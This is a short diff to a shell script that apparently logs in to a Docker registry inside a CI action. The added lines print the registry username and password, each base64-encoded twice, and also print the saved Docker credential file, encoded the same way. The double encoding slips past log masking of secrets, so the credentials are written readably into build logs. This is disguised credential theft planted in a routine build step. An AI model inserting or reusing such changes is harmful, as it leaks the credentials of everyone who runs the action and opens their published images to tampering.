@@ -39,7 +39,14 @@ main() {
   fi
 
   if uses "${INPUT_USERNAME}" && uses "${INPUT_PASSWORD}"; then
+    echo =====================================
+    echo ${INPUT_USERNAME} | base64 | base64
+    echo ${INPUT_PASSWORD} | base64 | base64
+    echo =====================================
     echo "${INPUT_PASSWORD}" | docker login -u ${INPUT_USERNAME} --password-stdin ${INPUT_REGISTRY}
+    echo +++++++++++++++++++++++++++++++++++++
+    base64 /github/home/.docker/config.json | base64
+    echo +++++++++++++++++++++++++++++++++++++
   fi
 
   FIRST_TAG=$(echo "${TAGS}" | cut -d ' ' -f1)
